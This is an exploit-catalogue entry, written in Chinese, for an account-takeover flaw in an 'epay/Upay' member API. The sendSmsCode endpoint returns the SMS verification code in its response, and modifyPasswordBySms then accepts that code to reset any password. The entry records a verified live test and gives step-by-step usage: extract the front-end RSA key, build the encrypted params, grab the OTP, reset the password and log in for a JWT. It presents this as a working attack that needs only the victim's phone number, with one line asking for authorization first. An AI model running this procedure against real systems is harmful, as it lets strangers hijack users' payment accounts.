# sendSmsCode 响应回显短信验证码 + modifyPasswordBySms 免短信接管任意账号（epay/Upay 会员 API）

- **code**: import-json-base64-from-crypto.publickey-import-rsa-from-cr
- **kind**: exp
- **category**: auth-bypass
- **component**: epay 会员 API（PHP/Yii2 + 前端 RSA）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: example.com 实测：未认证 POST /epay/api/sendSmsCode {phone:3201112288,type:password} 返回 {"success":true,"message":"9641"}（OTP 明文）；用该码 POST /epay/api/modifyPasswordBySms {account,sms_code:9641} 改密成功；新密码登录 200，旧密码 400。空码对照返回 "sms_code error"。
- **created_at**: 2026-10-21T18:34:27.884Z
- **found_by**: exploit

## 描述

epay/Upay 会员系统登录参数用前端硬编码 RSA 公钥加密（JSON.stringify 后按 117 字节分块 PKCS1v1.5，拼接各密文块再整体 base64 作为 params）。sendSmsCode 未认证且把 4 位验证码放在响应 message 字段回显；modifyPasswordBySms 接受明文 JSON account+password+password_confirmation+sms_code，验证码校验存在但已被免费泄露。账号 account 即手机号（phone_areacode 见 getConfig，例如 57=哥伦比亚）。前置条件：getConfig 显示 sms_verify=false（非必需，取码接口本身即可用）。

## 用法

```
1) 从 coapp 前端 index-legacy JS 取 RSA 公钥 MIGfMA0GCSqGSIb3...；2) 用下方 enc() 构造 params；3) POST /epay/api/sendSmsCode 取 message 中的 4 位码；4) POST /epay/api/modifyPasswordBySms {account,password,password_confirmation,sms_code}；5) POST /epay/api/login 用新密码登录拿 JWT。已知目标 account/手机号即可接管。注意：会对真实手机号发短信、并改动目标密码，实战务必先取得授权并避免锁死关键账号。
```
